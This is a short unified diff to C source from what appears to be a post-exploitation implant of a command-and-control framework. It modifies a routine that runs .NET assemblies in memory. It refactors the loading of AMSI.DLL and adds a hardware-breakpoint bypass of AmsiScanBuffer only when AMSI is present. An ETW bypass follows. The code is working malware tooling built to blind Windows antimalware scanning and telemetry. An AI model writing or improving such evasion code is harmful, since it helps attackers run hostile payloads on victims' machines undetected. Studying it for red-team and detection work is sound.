@@ -27,6 +27,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     NTSTATUS       Status         = STATUS_SUCCESS;
     DWORD          ThreadId       = 0;
     HRESULT        Result         = S_OK;
+    BOOL           AmsiIsLoaded   = FALSE;
 
     if ( ! Assembly.Buffer || ! Assembly.Length )
         return FALSE;
@@ -109,12 +110,9 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );
 
         /* check if Amsi is loaded */
+        AmsiIsLoaded = TRUE;
         if ( ! Instance.Modules.Amsi ) {
-            if ( ( Instance.Modules.Amsi = LdrModuleLoad( "AMSI.DLL" ) ) ) {
-                Instance.Win32.AmsiScanBuffer = LdrFunctionAddr( Instance.Modules.Amsi, H_FUNC_AMSISCANBUFFER );
-            } else {
-                PUTS( "Failed to load Amsi.dll" )
-            }
+            AmsiIsLoaded = RtAmsi();
         }
 
         PUTS( "Init HwBp Engine" )
@@ -126,10 +124,13 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         ThreadId = U_PTR( Instance.Teb->ClientId.UniqueThread );
 
         /* add Amsi bypass */
-        PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
-        if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance.Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
-            PRINTF( "Failed adding exception to HwBp Engine: %p\n", Status )
-            return FALSE;
+        if ( AmsiIsLoaded )
+        {
+            PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
+            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance.Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
+                PRINTF( "Failed adding exception to HwBp Engine: %p\n", Status )
+                return FALSE;
+            }
         }
 
         /* add Etw bypass */
